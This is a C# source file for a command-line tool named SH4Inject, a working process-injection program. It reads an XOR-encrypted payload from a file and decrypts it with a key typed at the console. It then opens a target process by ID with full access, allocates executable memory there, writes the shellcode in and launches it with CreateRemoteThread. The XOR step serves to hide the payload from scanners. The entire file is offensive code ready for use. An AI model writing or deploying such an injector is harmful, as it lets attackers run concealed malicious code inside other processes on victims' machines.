using System;
using System.IO;
using System.Runtime.InteropServices;

namespace SH4Inject
{
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        public static byte[] XOR(byte[] payload, string key)
        {
            byte[] xor_string = new byte[payload.Length];
            char[] xor_key = key.ToCharArray();
            for (int i = 0; i < payload.Length; i++)
            {
                xor_string[i] = (byte)(payload[i] ^ xor_key[i % xor_key.Length]);
            }
            return xor_string;
        }

        static void Main(string[] args)
        {
            if (args == null || args.Length == 0)
            {
                Console.WriteLine("Example: SH4Inject.exe <path to XOR'ed payload> <PID to inject>");
            }
            else { 
                Console.WriteLine("The secret key: ");
                String key = Console.ReadLine();
                byte[] payload = File.ReadAllBytes(args[0]);
                byte[] decrypted_payload = XOR(payload, key);

                var hProcess = OpenProcess(0x001F0FFF, false, int.Parse(args[1]));
                var alloc = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)decrypted_payload.Length, 0x1000 | 0x2000, 0x40);

                WriteProcessMemory(hProcess, alloc, decrypted_payload, (uint)decrypted_payload.Length, out UIntPtr bytesWritten);
                CreateRemoteThread(hProcess, IntPtr.Zero, 0, alloc, IntPtr.Zero, 0, IntPtr.Zero);
            }
        }
    }
}
